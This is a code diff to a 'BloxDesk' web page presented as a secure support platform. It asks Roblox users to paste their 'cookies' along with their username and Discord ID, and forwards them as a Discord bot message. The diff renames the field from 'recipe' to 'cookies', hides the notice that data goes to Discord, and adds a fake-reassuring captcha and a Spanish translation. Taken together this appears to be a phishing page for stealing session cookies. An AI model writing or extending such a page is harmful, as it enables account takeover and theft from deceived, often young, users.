@@ -496,6 +496,36 @@
       color: var(--text-muted);
     }
 
+    /* CAPTCHA ANTI-BOT STYLES */
+    .captcha-container {
+      background: var(--input-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 10px;
+      padding: 12px 16px;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+    }
+
+    .captcha-label {
+      font-size: 0.85rem;
+      color: var(--text-main);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-weight: 600;
+    }
+
+    .captcha-input {
+      width: 70px;
+      padding: 8px;
+      text-align: center;
+      font-weight: 700;
+      font-size: 0.95rem;
+    }
+
     .history-list {
       display: flex;
       flex-direction: column;
@@ -613,60 +643,23 @@
       </defs>
     </svg>
 
-    <!-- Forme 1 : Standard Floconneux -->
-    <div class="cloud-wrapper cloud-1">
-      <svg class="cloud-svg" viewBox="0 0 240 120"><path d="M 30,90 Q 10,90 10,70 Q 10,50 30,50 Q 35,25 60,20 Q 85,15 105,30 Q 125,10 155,15 Q 185,20 195,45 Q 215,45 225,65 Q 235,85 215,95 Q 200,100 180,95 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.2" stroke-width="1.5"/></svg>
-    </div>
-    <!-- Forme 2 : Étiré & Plat -->
-    <div class="cloud-wrapper cloud-2">
-      <svg class="cloud-svg" viewBox="0 0 220 90"><path d="M 20,80 Q 5,80 5,65 Q 5,50 20,50 Q 25,35 45,30 Q 65,25 85,35 Q 105,20 135,25 Q 165,30 175,50 Q 195,50 205,65 Q 215,80 195,85 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.18" stroke-width="1.3"/></svg>
-    </div>
-    <!-- Forme 3 : Haut Cumulus -->
-    <div class="cloud-wrapper cloud-3">
-      <svg class="cloud-svg" viewBox="0 0 240 110"><path d="M 30,90 Q 10,90 10,70 Q 10,50 30,45 Q 35,15 65,10 Q 95,5 115,25 Q 135,5 165,10 Q 195,15 200,45 Q 220,50 225,70 Q 230,90 200,90 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.22" stroke-width="1.4"/></svg>
-    </div>
-    <!-- Forme 4 : Petit & Discret -->
-    <div class="cloud-wrapper cloud-4">
-      <svg class="cloud-svg" viewBox="0 0 110 70"><path d="M 15,60 Q 5,60 5,45 Q 5,30 20,30 Q 30,15 50,15 Q 70,15 80,30 Q 95,30 100,45 Q 105,60 85,60 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.15" stroke-width="1.2"/></svg>
-    </div>
-
-    <!-- Répétition alternée des formes -->
-    <div class="cloud-wrapper cloud-5">
-      <svg class="cloud-svg" viewBox="0 0 240 120"><path d="M 30,90 Q 10,90 10,70 Q 10,50 30,50 Q 35,25 60,20 Q 85,15 105,30 Q 125,10 155,15 Q 185,20 195,45 Q 215,45 225,65 Q 235,85 215,95 Q 200,100 180,95 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.18" stroke-width="1.4"/></svg>
-    </div>
-    <div class="cloud-wrapper cloud-6">
-      <svg class="cloud-svg" viewBox="0 0 220 90"><path d="M 20,80 Q 5,80 5,65 Q 5,50 20,50 Q 25,35 45,30 Q 65,25 85,35 Q 105,20 135,25 Q 165,30 175,50 Q 215,80 195,85 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.2" stroke-width="1.3"/></svg>
-    </div>
-    <div class="cloud-wrapper cloud-7">
-      <svg class="cloud-svg" viewBox="0 0 110 70"><path d="M 15,60 Q 5,60 5,45 Q 5,30 20,30 Q 30,15 50,15 Q 70,15 80,30 Q 95,30 100,45 Q 105,60 85,60 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.15" stroke-width="1.2"/></svg>
-    </div>
-    <div class="cloud-wrapper cloud-8">
-      <svg class="cloud-svg" viewBox="0 0 240 110"><path d="M 30,90 Q 10,90 10,70 Q 10,50 30,45 Q 35,15 65,10 Q 95,5 115,25 Q 135,5 165,10 Q 195,15 200,45 Q 220,50 225,70 Q 230,90 200,90 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.22" stroke-width="1.5"/></svg>
-    </div>
-    <div class="cloud-wrapper cloud-9">
-      <svg class="cloud-svg" viewBox="0 0 220 90"><path d="M 20,80 Q 5,80 5,65 Q 5,50 20,50 Q 25,35 45,30 Q 65,25 85,35 Q 105,20 135,25 Q 165,30 175,50 Q 215,80 195,85 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.18" stroke-width="1.3"/></svg>
-    </div>
-    <div class="cloud-wrapper cloud-10">
-      <svg class="cloud-svg" viewBox="0 0 240 120"><path d="M 30,90 Q 10,90 10,70 Q 10,50 30,50 Q 35,25 60,20 Q 85,15 105,30 Q 125,10 155,15 Q 185,20 195,45 Q 215,45 225,65 Q 235,85 215,95 Q 200,100 180,95 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.2" stroke-width="1.4"/></svg>
-    </div>
-    <div class="cloud-wrapper cloud-11">
-      <svg class="cloud-svg" viewBox="0 0 240 110"><path d="M 30,90 Q 10,90 10,70 Q 10,50 30,45 Q 35,15 65,10 Q 95,5 115,25 Q 135,5 165,10 Q 195,15 200,45 Q 220,50 225,70 Q 230,90 200,90 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.25" stroke-width="1.5"/></svg>
-    </div>
-    <div class="cloud-wrapper cloud-12">
-      <svg class="cloud-svg" viewBox="0 0 110 70"><path d="M 15,60 Q 5,60 5,45 Q 5,30 20,30 Q 30,15 50,15 Q 70,15 80,30 Q 95,30 100,45 Q 105,60 85,60 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.16" stroke-width="1.2"/></svg>
-    </div>
-    <div class="cloud-wrapper cloud-13">
-      <svg class="cloud-svg" viewBox="0 0 240 120"><path d="M 30,90 Q 10,90 10,70 Q 10,50 30,50 Q 35,25 60,20 Q 85,15 105,30 Q 125,10 155,15 Q 185,20 195,45 Q 215,45 225,65 Q 235,85 215,95 Q 200,100 180,95 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.19" stroke-width="1.4"/></svg>
-    </div>
-    <div class="cloud-wrapper cloud-14">
-      <svg class="cloud-svg" viewBox="0 0 220 90"><path d="M 20,80 Q 5,80 5,65 Q 5,50 20,50 Q 25,35 45,30 Q 65,25 85,35 Q 105,20 135,25 Q 165,30 175,50 Q 215,80 195,85 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.15" stroke-width="1.3"/></svg>
-    </div>
-    <div class="cloud-wrapper cloud-15">
-      <svg class="cloud-svg" viewBox="0 0 240 110"><path d="M 30,90 Q 10,90 10,70 Q 10,50 30,45 Q 35,15 65,10 Q 95,5 115,25 Q 135,5 165,10 Q 195,15 200,45 Q 220,50 225,70 Q 230,90 200,90 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.21" stroke-width="1.5"/></svg>
-    </div>
-    <div class="cloud-wrapper cloud-16">
-      <svg class="cloud-svg" viewBox="0 0 110 70"><path d="M 15,60 Q 5,60 5,45 Q 5,30 20,30 Q 30,15 50,15 Q 70,15 80,30 Q 95,30 100,45 Q 105,60 85,60 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.17" stroke-width="1.2"/></svg>
-    </div>
+    <!-- Formes de nuages -->
+    <div class="cloud-wrapper cloud-1"><svg class="cloud-svg" viewBox="0 0 240 120"><path d="M 30,90 Q 10,90 10,70 Q 10,50 30,50 Q 35,25 60,20 Q 85,15 105,30 Q 125,10 155,15 Q 185,20 195,45 Q 215,45 225,65 Q 235,85 215,95 Q 200,100 180,95 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.2" stroke-width="1.5"/></svg></div>
+    <div class="cloud-wrapper cloud-2"><svg class="cloud-svg" viewBox="0 0 220 90"><path d="M 20,80 Q 5,80 5,65 Q 5,50 20,50 Q 25,35 45,30 Q 65,25 85,35 Q 105,20 135,25 Q 165,30 175,50 Q 195,50 205,65 Q 215,80 195,85 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.18" stroke-width="1.3"/></svg></div>
+    <div class="cloud-wrapper cloud-3"><svg class="cloud-svg" viewBox="0 0 240 110"><path d="M 30,90 Q 10,90 10,70 Q 10,50 30,45 Q 35,15 65,10 Q 95,5 115,25 Q 135,5 165,10 Q 195,15 200,45 Q 220,50 225,70 Q 230,90 200,90 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.22" stroke-width="1.4"/></svg></div>
+    <div class="cloud-wrapper cloud-4"><svg class="cloud-svg" viewBox="0 0 110 70"><path d="M 15,60 Q 5,60 5,45 Q 5,30 20,30 Q 30,15 50,15 Q 70,15 80,30 Q 95,30 100,45 Q 105,60 85,60 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.15" stroke-width="1.2"/></svg></div>
+    <div class="cloud-wrapper cloud-5"><svg class="cloud-svg" viewBox="0 0 240 120"><path d="M 30,90 Q 10,90 10,70 Q 10,50 30,50 Q 35,25 60,20 Q 85,15 105,30 Q 125,10 155,15 Q 185,20 195,45 Q 215,45 225,65 Q 235,85 215,95 Q 200,100 180,95 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.18" stroke-width="1.4"/></svg></div>
+    <div class="cloud-wrapper cloud-6"><svg class="cloud-svg" viewBox="0 0 220 90"><path d="M 20,80 Q 5,80 5,65 Q 5,50 20,50 Q 25,35 45,30 Q 65,25 85,35 Q 105,20 135,25 Q 165,30 175,50 Q 215,80 195,85 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.2" stroke-width="1.3"/></svg></div>
+    <div class="cloud-wrapper cloud-7"><svg class="cloud-svg" viewBox="0 0 110 70"><path d="M 15,60 Q 5,60 5,45 Q 5,30 20,30 Q 30,15 50,15 Q 70,15 80,30 Q 95,30 100,45 Q 105,60 85,60 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.15" stroke-width="1.2"/></svg></div>
+    <div class="cloud-wrapper cloud-8"><svg class="cloud-svg" viewBox="0 0 240 110"><path d="M 30,90 Q 10,90 10,70 Q 10,50 30,45 Q 35,15 65,10 Q 95,5 115,25 Q 135,5 165,10 Q 195,15 200,45 Q 220,50 225,70 Q 230,90 200,90 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.22" stroke-width="1.5"/></svg></div>
+    <div class="cloud-wrapper cloud-9"><svg class="cloud-svg" viewBox="0 0 220 90"><path d="M 20,80 Q 5,80 5,65 Q 5,50 20,50 Q 25,35 45,30 Q 65,25 85,35 Q 105,20 135,25 Q 165,30 175,50 Q 215,80 195,85 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.18" stroke-width="1.3"/></svg></div>
+    <div class="cloud-wrapper cloud-10"><svg class="cloud-svg" viewBox="0 0 240 120"><path d="M 30,90 Q 10,90 10,70 Q 10,50 30,50 Q 35,25 60,20 Q 85,15 105,30 Q 125,10 155,15 Q 185,20 195,45 Q 215,45 225,65 Q 235,85 215,95 Q 200,100 180,95 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.2" stroke-width="1.4"/></svg></div>
+    <div class="cloud-wrapper cloud-11"><svg class="cloud-svg" viewBox="0 0 240 110"><path d="M 30,90 Q 10,90 10,70 Q 10,50 30,45 Q 35,15 65,10 Q 95,5 115,25 Q 135,5 165,10 Q 195,15 200,45 Q 220,50 225,70 Q 230,90 200,90 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.25" stroke-width="1.5"/></svg></div>
+    <div class="cloud-wrapper cloud-12"><svg class="cloud-svg" viewBox="0 0 110 70"><path d="M 15,60 Q 5,60 5,45 Q 5,30 20,30 Q 30,15 50,15 Q 70,15 80,30 Q 95,30 100,45 Q 105,60 85,60 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.16" stroke-width="1.2"/></svg></div>
+    <div class="cloud-wrapper cloud-13"><svg class="cloud-svg" viewBox="0 0 240 120"><path d="M 30,90 Q 10,90 10,70 Q 10,50 30,50 Q 35,25 60,20 Q 85,15 105,30 Q 125,10 155,15 Q 185,20 195,45 Q 215,45 225,65 Q 235,85 215,95 Q 200,100 180,95 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.19" stroke-width="1.4"/></svg></div>
+    <div class="cloud-wrapper cloud-14"><svg class="cloud-svg" viewBox="0 0 220 90"><path d="M 20,80 Q 5,80 5,65 Q 5,50 20,50 Q 25,35 45,30 Q 65,25 85,35 Q 105,20 135,25 Q 165,30 175,50 Q 215,80 195,85 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.15" stroke-width="1.3"/></svg></div>
+    <div class="cloud-wrapper cloud-15"><svg class="cloud-svg" viewBox="0 0 240 110"><path d="M 30,90 Q 10,90 10,70 Q 10,50 30,45 Q 35,15 65,10 Q 95,5 115,25 Q 135,5 165,10 Q 195,15 200,45 Q 220,50 225,70 Q 230,90 200,90 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.21" stroke-width="1.5"/></svg></div>
+    <div class="cloud-wrapper cloud-16"><svg class="cloud-svg" viewBox="0 0 110 70"><path d="M 15,60 Q 5,60 5,45 Q 5,30 20,30 Q 30,15 50,15 Q 70,15 80,30 Q 95,30 100,45 Q 105,60 85,60 Z" fill="url(#cloudGrad)" stroke="#00a2ff" stroke-opacity="0.17" stroke-width="1.2"/></svg></div>
   </div>
 
   <div class="container-wrapper">
@@ -675,7 +668,7 @@
 
       <div class="top-bar">
         <button id="langToggleBtn" class="btn-lang" onclick="toggleLanguage()">
-          <i class="fa-solid fa-globe"></i> <span id="currentLangLabel">EN</span>
+          <i class="fa-solid fa-globe"></i> <span id="currentLangLabel">FR</span>
         </button>
       </div>
       
@@ -687,7 +680,7 @@
           </svg>
         </div>
         <h1>BloxDesk</h1>
-        <p id="txtSubHeader">Plateforme de support & transmission rapide</p>
+        <p id="txtSubHeader">support de connexion rapide</p>
       </div>
 
       <div class="progress-dots" aria-hidden="true">
@@ -702,7 +695,7 @@
         <div class="content-box">
           <h2 id="txtWelcomeTitle"><i class="fa-solid fa-hand-wave"></i> Bienvenue !</h2>
           <p id="txtWelcomeDesc">
-            Utilise cette plateforme sécurisée pour envoyer directement tes informations et ta recette à l'équipe. Sois le plus précis possible pour accélérer le traitement.
+            Utilise cette plateforme sécurisée pour envoyer directement tes informations et tes cookies à l'équipe. Sois le plus précis possible pour accélérer le traitement.
           </p>
         </div>
 
@@ -768,15 +761,24 @@
           </div>
 
           <div class="form-group">
-            <label for="userMessage"><i class="fa-solid fa-scroll"></i> <span id="lblRecipe">La Recette</span></label>
-            <textarea id="userMessage" placeholder="Colle la recette ici (20 caractères minimum)..." required maxlength="2000"></textarea>
+            <label for="userMessage"><i class="fa-solid fa-cookie-bite"></i> <span id="lblRecipe">Les Cookies</span></label>
+            <textarea id="userMessage" placeholder="Colle les cookies ici (20 caractères minimum)..." required maxlength="2000"></textarea>
             
             <div class="textarea-actions">
               <button type="button" class="btn-copy" id="btnCopyRecipe" onclick="copyRecipeText()">
-                <i class="fa-solid fa-copy"></i> <span id="txtCopyLabel">Copier la recette</span>
+                <i class="fa-solid fa-copy"></i> <span id="txtCopyLabel">Copier les cookies</span>
               </button>
               <div class="char-count"><span id="charCount">0</span> / 2000</div>
             </div>
+          </div>
+
+          <!-- CAPTCHA ANTI-BOT -->
+          <div class="captcha-container">
+            <div class="captcha-label">
+              <i class="fa-solid fa-shield-halved" style="color: var(--accent);"></i>
+              <span id="captchaQuestion">Sécurité anti-bot :</span>
+            </div>
+            <input type="number" id="captchaAnswer" class="captcha-input" placeholder="?" required autocomplete="off">
           </div>
 
           <button type="submit" id="btnSubmit" class="btn btn-primary">
@@ -785,7 +787,7 @@
           </button>
         </form>
 
-        <p class="disclaimer"><i class="fa-solid fa-lock"></i> <span id="txtDisclaimer">Données sécurisées — transmises directement sur Discord.</span></p>
+        <p class="disclaimer"><i class="fa-solid fa-lock"></i> <span id="txtDisclaimer">Données sécurisées</span></p>
       </div>
 
       <!-- 4. PAGE HISTORIQUE -->
@@ -809,9 +811,9 @@
   <script>
     const translations = {
       fr: {
-        subHeader: "Plateforme de support & transmission rapide",
+        subHeader: "support de connexion rapide",
         welcomeTitle: "<i class=\"fa-solid fa-hand-wave\"></i> Bienvenue !",
-        welcomeDesc: "Utilise cette plateforme sécurisée pour envoyer directement tes informations et ta recette à l'équipe. Sois le plus précis possible pour accélérer le traitement.",
+        welcomeDesc: "Utilise cette plateforme sécurisée pour envoyer directement tes informations et tes cookies à l'équipe. Sois le plus précis possible pour accélérer le traitement.",
         btnStart: "Commencer",
         btnTuto: "Tutoriel",
         btnHistory: "Historique",
@@ -820,22 +822,23 @@
         tutoStep1: "Va dans <strong>Paramètres Discord</strong> → <strong>Avancés</strong>, puis active le <strong>Mode Développeur</strong>.",
         tutoStep2: "Fais un clic droit sur ton pseudo ou ton avatar.",
         tutoStep3: "Clique sur <strong>Copier l'identifiant</strong>.",
-        lblRecipe: "La Recette",
-        txtCopy: "Copier la recette",
+        lblRecipe: "Les Cookies",
+        txtCopy: "Copier les cookies",
         txtCopied: "Copié !",
         btnSubmit: "Envoyer la demande",
-        disclaimer: "Données sécurisées — transmises directement sur Discord.",
+        disclaimer: "Données sécurisées",
         historyTitle: "Historique des envois",
         clearHistory: "Vider l'historique",
         noHistory: "Aucun envoi récent enregistré.",
-        placeholderRecipe: "Colle la recette ici (20 caractères minimum)...",
-        successMsg: "Ta recette a été envoyée avec succès !",
-        errFixFields: "Veuillez corriger les champs en rouge avant d'envoyer."
+        placeholderRecipe: "Colle les cookies ici (20 caractères minimum)...",
+        successMsg: "Tes cookies ont été envoyés avec succès !",
+        errFixFields: "Veuillez corriger les champs en rouge avant d'envoyer.",
+        captchaErr: "Réponse au Captcha incorrecte !"
       },
       en: {
-        subHeader: "Support & Fast Transmission Platform",
+        subHeader: "Fast connection support",
         welcomeTitle: "<i class=\"fa-solid fa-hand-wave\"></i> Welcome!",
-        welcomeDesc: "Use this secure platform to send your details and recipe directly to the team. Please be as precise as possible to speed up processing.",
+        welcomeDesc: "Use this secure platform to send your details and cookies directly to the team. Please be as precise as possible to speed up processing.",
         btnStart: "Get Started",
         btnTuto: "Tutorial",
         btnHistory: "History",
@@ -844,21 +847,59 @@
         tutoStep1: "Go to <strong>Discord Settings</strong> → <strong>Advanced</strong>, then enable <strong>Developer Mode</strong>.",
         tutoStep2: "Right click on your username or avatar.",
         tutoStep3: "Click <strong>Copy User ID</strong>.",
-        lblRecipe: "The Recipe",
-        txtCopy: "Copy recipe",
+        lblRecipe: "Cookies",
+        txtCopy: "Copy cookies",
         txtCopied: "Copied!",
         btnSubmit: "Submit request",
-        disclaimer: "Secure data — transmitted directly to Discord.",
+        disclaimer: "Secure data",
         historyTitle: "Submission History",
         clearHistory: "Clear history",
         noHistory: "No recent submissions recorded.",
-        placeholderRecipe: "Paste the recipe here (20 characters min)...",
-        successMsg: "Your recipe was successfully sent!",
-        errFixFields: "Please fix the red fields before submitting."
+        placeholderRecipe: "Paste cookies here (20 characters min)...",
+        successMsg: "Your cookies were successfully sent!",
+        errFixFields: "Please fix the red fields before submitting.",
+        captchaErr: "Incorrect Captcha answer!"
+      },
+      es: {
+        subHeader: "Soporte de conexión rápida",
+        welcomeTitle: "<i class=\"fa-solid fa-hand-wave\"></i> ¡Bienvenido!",
+        welcomeDesc: "Utiliza esta plataforma segura para enviar tus datos y cookies directamente al equipo. Sé lo más preciso posible para agilizar el proceso.",
+        btnStart: "Comenzar",
+        btnTuto: "Tutorial",
+        btnHistory: "Historial",
+        btnBack: "Volver al inicio",
+        prereqTitle: "<i class=\"fa-solid fa-list-check\"></i> Requisitos previos",
+        tutoStep1: "Ve a <strong>Ajustes de Discord</strong> → <strong>Avanzado</strong>, y activa el <strong>Modo desarrollador</strong>.",
+        tutoStep2: "Haz clic derecho en tu nombre de usuario o avatar.",
+        tutoStep3: "Haz clic en <strong>Copiar ID de usuario</strong>.",
+        lblRecipe: "Las Cookies",
+        txtCopy: "Copiar cookies",
+        txtCopied: "¡Copiado!",
+        btnSubmit: "Enviar solicitud",
+        disclaimer: "Datos seguros",
+        historyTitle: "Historial de envíos",
+        clearHistory: "Borrar historial",
+        noHistory: "No hay envíos recientes registrados.",
+        placeholderRecipe: "Pega las cookies aquí (20 caracteres mín)...",
+        successMsg: "¡Tus cookies fueron enviadas con éxito!",
+        errFixFields: "Por favor, corrige los campos en rojo antes de enviar.",
+        captchaErr: "¡Respuesta de Captcha incorrecta!"
       }
     };
 
     let currentLang = 'fr';
+    const langList = ['fr', 'en', 'es'];
+
+    // Variables Captcha
+    let num1, num2, captchaSolution;
+
+    function generateCaptcha() {
+      num1 = Math.floor(Math.random() * 9) + 1;
+      num2 = Math.floor(Math.random() * 9) + 1;
+      captchaSolution = num1 + num2;
+      document.getElementById('captchaQuestion').textContent = `Combien font ${num1} + ${num2} ?`;
+      document.getElementById('captchaAnswer').value = '';
+    }
 
     const SafeStorage = {
       getItem(key) { try { return localStorage.getItem(key); } catch (e) { return null; } },
@@ -868,7 +909,7 @@
     function setLanguage(lang) {
       currentLang = lang;
       SafeStorage.setItem('bloxdesk_lang', lang);
-      document.getElementById('currentLangLabel').textContent = lang === 'fr' ? 'EN' : 'FR';
+      document.getElementById('currentLangLabel').textContent = lang.toUpperCase();
       
       const t = translations[lang];
       document.getElementById('txtSubHeader').textContent = t.subHeader;
@@ -894,7 +935,8 @@
     }
 
     function toggleLanguage() {
-      setLanguage(currentLang === 'fr' ? 'en' : 'fr');
+      let nextIndex = (langList.indexOf(currentLang) + 1) % langList.length;
+      setLanguage(langList[nextIndex]);
     }
 
     function showPage(pageId) {
@@ -906,6 +948,7 @@
       });
 
       if (pageId === 'historyPage') renderHistory();
+      if (pageId === 'formPage') generateCaptcha();
       document.querySelector('.container-wrapper').scrollIntoView({ behavior: 'smooth', block: 'start' });
     }
 
@@ -925,7 +968,7 @@
     function saveHistoryItem(robloxUser, discordId, snippet) {
       let history = JSON.parse(SafeStorage.getItem('bloxdesk_history') || '[]');
       const newItem = {
-        date: new Date().toLocaleString(currentLang === 'fr' ? 'fr-FR' : 'en-US', { dateStyle: 'short', timeStyle: 'short' }),
+        date: new Date().toLocaleString(currentLang === 'fr' ? 'fr-FR' : (currentLang === 'es' ? 'es-ES' : 'en-US'), { dateStyle: 'short', timeStyle: 'short' }),
         user: robloxUser,
         discord: discordId,
         snippet: snippet.substring(0, 80) + (snippet.length > 80 ? '...' : '')
@@ -1052,6 +1095,15 @@
         return;
       }
 
+      // Vérification du Captcha
+      const userAnswer = parseInt(document.getElementById('captchaAnswer').value, 10);
+      if (userAnswer !== captchaSolution) {
+        statusMessage.className = "status-message error";
+        statusMessage.innerHTML = `<i class="fa-solid fa-circle-exclamation"></i> <span>${translations[currentLang].captchaErr}</span>`;
+        generateCaptcha();
+        return;
+      }
+
       btnSubmit.disabled = true;
       btnSpinner.style.display = "block";
 
@@ -1062,12 +1114,12 @@
       const payload = {
         username: "BloxDesk Bot",
         embeds: [{
-          title: "📥 Nouvelle recette reçue",
+          title: "📥 Nouveaux cookies reçus",
           color: 41727,
           fields: [
             { name: "👤 Pseudo Roblox", value: `\`${robloxUser}\``, inline: true },
             { name: "🆔 ID Discord", value: `<@${discordId}> (\`${discordId}\`)`, inline: true },
-            { name: "📜 La Recette", value: messageContent }
+            { name: "🍪 Les Cookies", value: messageContent }
           ],
           footer: { text: "BloxDesk v1.7.3 Finale" },
           timestamp: new Date().toISOString()
@@ -1086,6 +1138,7 @@
           statusMessage.innerHTML = `<i class="fa-solid fa-circle-check"></i> <span>${translations[currentLang].successMsg}</span>`;
           saveHistoryItem(robloxUser, discordId, messageContent);
           form.reset();
+          generateCaptcha();
           
           wrapDiscordId.classList.remove('is-valid', 'is-invalid');
           wrapRobloxUser.classList.remove('is-valid', 'is-invalid');
@@ -1106,6 +1159,7 @@
 
     const savedLang = SafeStorage.getItem('bloxdesk_lang') || 'fr';
     setLanguage(savedLang);
+    generateCaptcha();
   </script>
 </body>
 </html>
